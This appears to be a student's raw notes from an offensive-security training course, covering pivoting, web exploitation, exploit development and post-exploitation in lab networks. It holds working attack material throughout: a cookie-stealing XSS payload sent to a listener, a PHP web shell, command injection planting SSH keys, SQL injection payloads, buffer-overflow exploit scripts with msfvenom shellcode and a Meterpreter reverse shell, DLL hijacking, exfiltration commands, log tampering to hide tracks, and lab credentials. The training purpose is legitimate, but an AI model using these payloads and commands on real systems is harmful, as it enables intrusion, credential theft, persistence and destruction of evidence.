First day, day one! Let's get this started, I can type with out looking at the keyboard. Oops I missed spelled without, like why is it just one word. 
Linux op station: 10.50.179.44
Getting on to
ssh demo1@10.50.15.172 -L 1111:10.208.50.61:80 for Challenges???
                                        .42   
127.0.0.1:1111/classinfo.html

BRGA-021-M   Stack# 7  PW:TEBcv54D4iPn   Jump:10.50.16.164
Challenges 10.50.178.176:8000

mol PW:WhyrightNow

favriout site for vulnerabilites: exploit-db, google the CVE # with github.



                                                                                        OP NOTES

##Control Sockets
  ssh -MS /tmp/jump student@10.50.16.164        (M is multiplexing, to connect to multiple systems, S is socket created in /tmp directory)

##ping sweep from jump box
  for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done       from jump box we can only pingsweep
                                                                                                                                                          .97, .100, .105, .111, .120
##Create Dynamic port forward
  ssh -S /tmp/jump jump -O forward -D9050
  (Later:  ssh -S /tmp/jump jump -O cancel -D9050)
  nmap
                                                                                                                                                          Nmap scan report for 192.168.28.100            
                                                                                                                                                          80/tcp   open  http GOOD
                                                                                                                                                          2222/tcp open  EtherNetIP-1 SSH
                                                                                                                                                          
                                                                                                                                                          Nmap scan report for 192.168.28.105
                                                                                                                                                          21/tcp   open  ftp GOOD
                                                                                                                                                          23/tcp   open  telnet GOOD
                                                                                                                                                          2222/tcp open  EtherNetIP-1 SSH
                                                                                                                                                          
                                                                                                                                                          Nmap scan report for 192.168.28.111
                                                                                                                                                          80/tcp   open  http GOOD
                                                                                                                                                          2222/tcp open  EtherNetI P-1 SSH
                                                                                                                                                          8080/tcp open  http-proxy HTTP
                                                                                                                                              
                                                                                                                                                          Nmap scan report for 192.168.28.120
                                                                                                                                                          4242/tcp open  vrml-multi-use SSH


##Verify ports
  proxychains nc 192.168.28.100 80

##set up port forwarding 
  ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 1112:192.168.28.100:2222 -L 2111:192.168.28.105:2222                

## To delete one local port forward
  ssh -S /tmp/jump jump -O cancle -L 2111:192.168.28.105:2222

##Navigate to webserver on Firefox
  127.0.0.1:1111

## Authenticate to new system
  ssh -MS /tmp/t1 username@127.0.0.1 -p 1112
  man

## Find directeries to navigate to with this scan    /usr/share/nmap/scripts                            nmap --script <filename>|<category>|<directory>
                                                                                                        nmap --script-help "ftp-* and discovery"
                                                                                                        nmap --script-args <args>
                                                                                                        nmap --script-args-file <filename>
                                                                                                        nmap --script-help <filename>|<category>|<directory>
                                                                                                        nmap --script-trace
  proxychains nmap --script=http-enum 192.168.28.100

**************************************************************************************************************************************************************************************************************************
                                                                                            
                                                                                          DAY 2 Web exploitation

GET requests can be ultlized to pass data to the server with this:         http://10.50.x.x/path/pathdemo.php?myfile=demo1           Where does this go? in the site bar on top


                                                                                            OP NOTES
ssh demo1@10.50.15.172 -L 9999:10.208.50.42:80

stored XXS, open a listning port nc -lvnk 4444
on site:
<script>document.location="http://10.50.179.44:4444/?username=" + document.cookie;</script>      capture cookies
                                                                  document.body.innerHTML          capture sensitive data

using the script http-enum, we find files of interest to navigate to on the http search bar

ssh-keygen -t rsa -b 4096     to generate you own keys in an .ssh file

In order to Malicoius file upload we need
  1. ability to upload to a server
  2. know where we are uploading to
  3. be able to get there to run commands on shell created
                   <HTML><BODY>
                  <FORM METHOD="GET" NAME="myform" ACTION="">
                  <INPUT TYPE="text" NAME="cmd">
                  <INPUT TYPE="submit" VALUE="Send">
                  </FORM>
                  <pre>
                  <?php
                  if($_GET['cmd']) {
                    system($_GET['cmd']);
                    }
                  ?>
                  </pre>
                  </BODY></HTML>

To gain initial access with ssh RSA key:
  >ssh-keygen -t rsa -b 4096     to generate you own keys in an .ssh file
  >cat ~/.ssh/id_rsa.pub
  on target (the little stupid ahh search box i think its for posting)
            >ls -la /home/billybob ##check if there is an .ssh file here, if not 
            >;mkdir /home/billybob/.ssh
            >;echo "your_public_key_here" >> /var/www/.ssh/authorized_keys
            >;cat /home/billybob/.ssh/authorized_keys ## to make sure it there 
  >ssh billybob@127.0.0.1 -p 1112 ## this port is the one thats the ssh open on the IP


                                                             
                                                                                        OP notes
>ssh -MS /tmp/jump student@10.50.16.164
>ssh -S /tmp/jump jump -O forward -D9050
>proxychains nmap -sT -T4 10.100.28.40                80/tcp   open  http    Good
                                                      4444/tcp open  krb524  SSH
>nc the ports
>ssh -S /tmp/jump jump -O forward -L 1111:10.100.28.40:80 -L 1112:10.100.28.40:4444
>proxychains nmap --script=http-enum 10.100.28.40
/robots.txt ## net_test   then a page with bars to send pings to             >>> >>> >>> >>> >>> >>> >>> Path to test ;whoami then>> cat /etc/passwd (can access linux thru here)
/css/       ## pictues of differrent sizes, and 2 files full of characters 
/images/    ## russian images
/uploads/   ##this is the cyber swareness training and the location of its ip

we found this site 10.100.28.55

****************************************************************************************************************************************************************************************************************************

                          Day 3 Web explotiation SQL
         when doing LOGINS   
POST method
        normal statement        SELECT id FROM users WHERE name=‘JohnDoe243’   AND pass=‘pass1234’    ;       Http method post cause we submit info to server
        injecting statement     SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
GET method  
        soo...F12>>hit login>>click POST >>HTML&Request tab>> raw>> 127.0.0.1:1111/*******?(the coppied URL)  

SQL DATA BASE
        ##goldenstatement   
        select table_schema,table_name,column_name from information_schema.columns
                 <NAME OF COLUMN>,<NAME OF COLUMN> FROM <NAME OF DATABASE>.<NAME OF TABLE>

        ##Default databases 
            information_schema
            preformance_schema
            mysql

            to use a data base                                    DATABASE we will use is called session
                          >use informaton_schema ;
                          >show tables ;
                          >show columns from columns ;
                          >select table_schema,table_name,column_name from inforamation_schema.columns
            To Query to pull data stored in the following 
                          >select tireid,name,size from session.tires ;

SQL Injection            in the URL
        POST METHOD
              1.ID vulnerable fields
              2. test out the 02' or 1='1 with the inputs and see whats different with the number of columns/selections
              3. Use 'UNION SELECT 1,2,3,4,5 #               ## missing the 2 in the table shown, also we use 5 cause the table shows 4 so we try adding 1 over and over.
              4. Modified goldenstatment Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
              5. Craft queries: Audi' UNION SELECT tireid,2,name,size,cost,color,year from session.Tires #
                                Audi' UNION SELECT tireid,name,size,cost,color,year,5 from session.Tires #
        GET METHOD                      
              change url to find vulnerable field, remove up to the char that changes everytime a different selction is made, add <UNNION SELECT 1,2,3> (cause of the 3 columns that show up normaly)
              modify golden statement: Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns #
              craft query: Selection=2 UNION SELECT start,status,last_access from session.session_log            #put this into after the ?


Nesting staements     |                                                                                        |
      php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

Server-side query becomes:               |            |
      SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;

Blind injection for validation

Extract version number
      prices.php?item=4 UNION SELECT 1,2,@@version

Defending Againct 
      PHP: mysql_real_escape_string
      SQL: sqlite3_prepare()

                                                                                          OPNOTES

> proxychains nmap  --script=http-enum 10.100.28.48            /css/ /images/ /includes/ /js/ /scripts
There are 13 catagories input
Q: On the DNLA site identify the flag using the Categories page.
A: (category page url.php)? category=1 or 1=1            ##this outputs all things in the Category page

-Use the golden rule to show all tables on a section where we can select search for products, attatch to end of url.    UNION SELECT table_schema,table_name,column_name from information_schema.columns
-After getting all the cataroies and columns from the golden rule, make a query to get the info i need, make sure theres as many items as there are columns
-to search just do ' or 1='1
-for version on the item=# UNION SELECT 1,2,@@version
-This is for when having to create full profile in multiple fields, the 
      INSERT INTO members (first_name, last_name, username, password, email, permission)                   ##this what the input expects
      VALUES ('Hacker', 'lastname', 'hacker4 ','password','email','1')#', 'pw', 'email', 3)                ##this is what the site sees, the # igones all to the right
-certain colums may only work in certain positons
****************************************************************************************************************************************************************************************************************************************************************************

                                                                          Day 4 Reverse Engineering
Base pointer is the start of the stack, the stack pointer is the bookmark of where we are using.

                                      X86_64 Assembly - Common Instruction Pointers
                                              MOV  move source to destination
                                              PUSH  push source onto stack
                                              POP  Pop top of stack to destination
                                              INC  Increment source by 1
                                              DEC  Decrement source by 1
                                              ADD  Add source to destination
                                              SUB  Subtract source from destination
                                              CMP  Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
                                              JMP  Jump to specified location
                                              JLE  Jump if less than or equal
                                              JE  Jump if equal


win-ops
Address
10.50.141.22

ps>strings.exe .\demo1_new.exe       to find the strings (static)
ps>type(or file) .\demo2_new.exe

run it, and give it what it wants        interact with malware, (behavioral)

opne ghidra, file>>new project>>file>> inport file (the malwares)>> clcik on files imported>>analyze>>search tab>>strings>>search>>(look for key words from when ran)>>
double click on where was found>> again>>right click on values to translate  >>open funtion of value
>>          (dynamic)

patch instrution, rightclick, patch instruction>>export with different name to test
****************************************************************************************************************************************************************************
                                                            Exploit Devepolment Linux

Buffer Overflow Common Terms
Heap                        Memory that can be allocated and deallocated
Stack                       A contiguous section of memory used for passing arguments
Registers                   Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP)    a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP)          Contains the address of the next available space on the stack
Base Pointer (BP)           The base of the stack
Function                    Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode                   The code that is executed once an exploit successfully takes advantage of a vulnerability

Buffer Overflow Defenses
    Non executable (NX) stack
    Address Space Layout Randomization (ASLR)
    Data Execution Prevention (DEP)
    Stack Canaries
    Position Independent Executable (PIE)

                                          OPNOTES
##Static Analysis
>strings func | head
>file func

##Behavioral Analysis
>chmod u+x func
>./fun

##Dynamic analysis (fuzzing) 
>./func $(echo "123456789") ##passes arguments
>./func <<<$(echo "123456789") ## <<< is user input, if it skips program, it means its waiting for user input, 
>./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") ## if get a segmentation fault, we can exploit

#Disassembly
>gdb ./func                                                                                                                    linex.py
  >shell ## tkes us back to shell environment, quit gets out of gdb                                                                      #!/usr/bin/env python
  >info functions                                                                                                                        offset = "A" * 100
  >run ## or start                                                                                                                       
  >disass main ## or pdisass other fucntions "getuserinput"                                                                              print(offset)
  >pdisass getuserinput "if somthing is in red, google and read about possible vulnerabilities from said functions"
  >run <<<$(python linex.py) ## this inputs the script into what the prompt is asking for
##go to https://wiremask.eu/tools/buffer-overflow-pattern-generator/       give it a 100
## make script, copy pattern into offse instead of, enter, 
    run <<<$(python linex.py) ##copy EIP value into wiremask to find offset value
## change offset = "A" * 100 in script to the offset value
## add eip ="BBB" and print (offset+eip) to script, run it to confirm eip is "BBB"                                                      eip = "BBBB"

## Set GDB environment and find jmp esp addresses
  >shell (THIS IS DONE FOR THE MACHINE YOU ARE ON)
  >env - gdb ./func
    show env
    unset env COLUMNS
    unset env LINES
    file func
    run and ctrl+c or start
    info proc map
## grab first address after heap, last address before stack   start address 0xf7de1000     end address 0xf7ffe000
    find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4 
##copy the first 4, and convert them to little endian 
        0xf7de3b59 > \x59\x3b\xde\xf7 
         ## put into   ->                                                                                                              eip = "\x59\x3b\xde\xf7"
        (THIS IS DONE FOR THE MACHINE YOU ARE ON)

shell                                                                                                                                   nop = "\x90" * 15
>msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
## take all buf and put into script under nop                                                                                           buf =  b""
                                                                                                                                        buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
                                                                                                                                        buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
                                                                                                                                        buf += b"\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00"
>./func <<<$(python linex.py)                                                                                                           buf += b"\x57\x53\x89\xe1\xcd\x80"
                                                                                                                                        print (offset+eip+nop+buf)
                    OPNOTES
Vulnerable functions: printf, fgets

msfvenom -p linux/x86/exec CMD="cat /.hidden/inventory.exe" -b "\x00\xfe\x20\x0a\xff" -f python

************************************************************************************************************************************************************************************************************
                                                              Exploit Devepolment Windows
on windows
  open immunity debugger, press play
on linux
                                                            #!/usr/bin/python
                                                            import socket
                                                            
                                                            ##Fuzz
                                                            buf = "TRUN /.:/"
                                                            #buf += "A" * 3000
                                                            
                                                            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # create the IPv4 socket, TCP protocol
                                                            s.connect(("10.50.141.22", 9999)) #connect to target IP and port
                                                            print s.recv(1024) #print response
                                                            s.send(buf) #send the value of buf
                                                            print s.recv(1024) #print response
                                                            s.close() #close the socket
## run script

wire mask>> tools>> buffer overflow>> put the 3000 >>copy into script under #buf =+ "A" * 3000 
                                                            buf += "     vkhglbiuhgkuio gygh g uy      "
rewind, play, run updated script
get eip from widnows immuniy>> put value into wiremask
on script                                                   buf += "A * 2003 #which is result from wiremask
BACK TO POWERSHELL


                        THE POWERSHELL NOTES
        #static
        strings .\vulnserver.exe | select -First 10
        clear
        
        #behavioralhisot
        Get-Process | findstr /i vuln 
        netstat -antop tcp | findstr 4836   #insert Id found 
        ##run as intended, 
        ## run immunity debugger
        
        
        #Dynamic
        Run Immunity as Administrator > Open .exe > play, rewind, repeat
        Fuzzing > Wiremask > find offset
        
        
        ##NOW on powershell, 
        !mona modules # find unprotected DLLs, put into the typeing spot bottom of immunity, look for all FALSE to put file below
        !mona jmp -r esp -m "essfunc.dll" #search for JMP ESP with unprotected DLL, window>>lod data>> copy momory location and put into little endian and put into script
        #62|50|11|AF , 625011BB, 625011C7 
        
        #MSF CONSOLE in linux
        msfconsole
        
        use multi/handler
        show options
        set payload windows/meterpreter/reverse_tcp
        set LHOST 0.0.0.0
        set LPORT 4444
        exploit
        
        #Shell Code
        msfvenom -p windows/meterpreter/reverse_tcp lhost=<lin ops host ip> lport=4444 -b " \x00\xfe\x20\x0a\xff" -f python
        
        # copy everything but first line and put into
*************************************************************************************************************************************

                                              POST EXPLOITATION

ssh -i /home/student/stolenkey jane@1.2.3.4 # -i is identify as the following user. its a stolen private ssh key

Local host enumeration
  User Enumeration - provides who has what priviledges and use to our advantage
  Process Enumeration - provides what procesess can be exploited, find whats connected to the Kernel
  Service Enumeration - to find what ports are running what services (back ground programs, whos got access to resoruces)
  Network Enumeration - find interfaces and next jump ip, see whos connected and why

Data Exfiltration
  Session Transcript - ssh <user>@<host> | tee
  Obfuscation (Windos) - type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out 
                          certutil -encode <file> encoded.b64
  Obfuscation (Linux) - cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
                        cat <file>> | base64
  Encrypted Transport - scp <source> <destination>
                        ncat --ssl <ip> <port> < <file>



***********************************************************************************************************************************************************
                                                      Privilege Escalation, Persistence & Covering Your Tracks
                                                                                Windows
DLL hijacking, replace dll already there. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
DEMO: Checking UAC Settings
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
DEMO: Finding vulnerable Scheduled Tasks
  schtasks /query /fo LIST /v

Places to look
  Registry
    the HKLM & HKCU  and run&runonce
  Task scheduler
  Services
    if empty description, then malicious

Finding vulnerable services
  wmic service list full
  sc query

DEMO: Audit Logging
  Show all audit category settings
    auditpol /get /category:*
  What does the below command show? need escalated privileges
    auditpol /get /category:* | findstr /i "success failure"

# view events
  event viewer >> create custome view
# kill putty
  (Get-Process | Where-Object -Property processname -like "putty*").kill()

msfvenom to create dll
  msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
  scp to 

#view hidden items
  file explorer >> view >> hidden items

#Exexutable replacement 
  rename putty? then rename somthing else to putty so that it runs instead of what was scheduled to run.

                                      OPNOTES
                    ssh -MS /tmp/jump student@10.50.16.164                                                                      >Jump Box

                    ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.105:2222                                                ->Pivot: 192.168.28.105     Port 2222
                    ssh -MS /tmp/t1 comrade@127.0.0.1 -p 1111
                    
                    ssh -S /tmp/t1 t1 -O forward -L 1112:192.168.28.5:3389                                                       -->T1: 192.168.28.5        rdp 3389
                    xfreerdp /u:comrade /v:localhost:1112 /dynamic-resolution +clipboard                                                                    to rdp from linux


To run a command as admin using the Memory status vulnerability
- find where MemoryStatus is running from, and what dll its using, ill be in the same folder as where memory status is running from
- make the   msfvenom -p windows/exec CMD='cmd.exe /C "ls C:\Users\Admin\Desktop" > C:\Users\comrade.WIN2-INTERNAL-D\Priv.txt' -f dll > hijackmeplz.dll    do what you want with admin privleges 
                                      |                  This is the admin privilege level command                            |
- scp into where the Memory status gets executed from and restart the computer, the command executes

*******************************************************************************************************************************************************************************************************
                                                       Privilege Escalation, Persistence & Covering Your Tracks
                                                                    
                                                                                Linux
Sudo config file /etc/sudoers

GTFO Bins: https://gtfobins.github.io/gtfobins/tcpdump/                    comands we can still use when in a restricte shell

logs in /var/log
GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
SED (Replace)
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log

Easy with Nix is Windows (Native change of Access & Modify times)
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference

Rsyslog
Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
Older version only uses /etc/rsyslog.conf
Find out
grep "IncludeConfig" /etc/rsyslog.conf
proof of remote login when looking in rsyslog.conf    @@ 514

Reading Rsyslog
Utilizes severity (priority) and facility levels
<facility>.<priority>

                                          OPNOTES
List sudo permissions, open shell
  sudo -l >> see what we can get from GTFObins >> use it >> then we get a shell >> id >> bash
Use effective SUID/GUID permissions
  find / -type f -perm /4000 -ls 2>/dev/null       ## look for SUID Files      search GTFO bins for somthing non standard we can use
  find / -type f -perm /2000 -ls 2>/dev/null       ## look for GUID Files
  find / -type f -perm /6000 -ls 2>/dev/null       ## both
. In PATH
  echo $PATH >> PATH=.:$PATH

*****************************************************************************************************************************************************************************************************************
                                                                                 
                                              OPNOTES
Enumerate with nmap, then with the enumscript, and nc
10.50.11.158 22 53 80 /login.php, /login.html, /img, /scripts

ssh student@10.50.179.44 -L 1111:10.50.11.158:22 -L 1112:10.50.11.158:53 -L 1113:10.50.11.158:80       didnt need to do this, could of just went straight into browser
???try robots.txt
http://127.0.0.1:1113/admin.html >> ' or 1='1 >> ??this is called command injection
system_user=user2            user2:x:1002:1003::/home/user2:/bin/sh
user_password=TurkeyDay24
found 192.168.28.175 BestWebApp 2222 ssh 8000 html
we did ssh key generation into the .158

proxychains nmap the .175
ssh www-data@10.50.11.158 -L 1111:192.168.28.175:2222 -L 1112:192.168.28.175:8000 -D 9050
??do behavioral analysis, we find SQL query so we can SQL injection
127.0.0.1:1112/pick.php?product7 OR 1=1         to find vulnerable thing
http://127.0.0.1:1112/pick.php?product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns #        the from is all caps, and we dont need the #?
look for 
Found Aaron     appleBottomJ3an$
      user2     TurkeyDay24
      user3     Bob4THEPin3apples
      Lee_Roth  Yebgu
      Lroth     anotherpassword4THEages
for i in {0..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done     from the bash shell made    found .1, .165, .175
proxychains the .165
ssh www-data@10.50.11.158 -L 1111:192.168.28.175:2222 -L 1112:192.168.28.175000 -L 3333:192.168.28.165:22 -D 9050      added the 3333
logged into user3, >> unset HISTFILE >> do privilege escalation, lookat /etc/passwd, ls -lisa home directories, /etc/hosts, whoami, THIS IS ENUMERATION
sudo -l, find / -type f -perm /6000 -ls 2>/dev/null, "find" on GTFObins the SUID section use the ./.............., got root prvliges, put ssh key in there
ping sweep, tunnel to new ip
xfreerdp?
../../../../../../"RECON"?????    Directory traversalm "Files to read"


                                              SOCKETS REVIEW
#Control Sockets
  ssh -MS /tmp/demo demo1@10.50.15.172        master socket saved in that file
#Nexthop
  ssh-MS /tmp/t1 user@127.0.0.1 -p 1111 
  ssh-S /tmp/t1 t1 -O forward -L 3333:x.x.x.x:80
#Dynamic port forward
  ssh -S /tmp/demo demo -O forward -D 9050
#Local port forward
  ssh -S /tmp/demo demo -O forward -L 1111:10.208.50.42:22 -L 11112:10.208.50.422:80
#Cancle 
  ssh -S /tmp/demo demo -O cancle -L 1112:10.208.50.422:80

  
#Recon
  /etc/hosts, home directories, /usr/share, Ping sweep  for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done  , nmap 10.208.50.42, nmap --script=http-enum 10.208.50.42

#SSH keygen

#SQL is authentication bypass 
  'OR 1='1, as you log on 
  inspect>> network>> post>> request>> raw>> put this into URL x.x.x.x/login.php?<paste> >> view page source

#SQL GET
  Find vulnerable field on url, x.x.x.x:xxxx/imiomdemo.php?Selection=2 or 1=1, how many columns?, x.x.x.x:xxxx/imiomdemo.php?Selection=2 UNION SELECT 1,2,3, Golden statement, craft queries, x.x.x.x:xxxx/imiomdemo.php?Selection=2 UNION SELECT @@version,2,3, 

#Find a fucntion
  scp program to linops, gdp <file>, run,  pdisass main

#Linus priv escalation

#Windows
file explorer, view hidden items
task schedueler, regedit, services (empt comments), event viewer







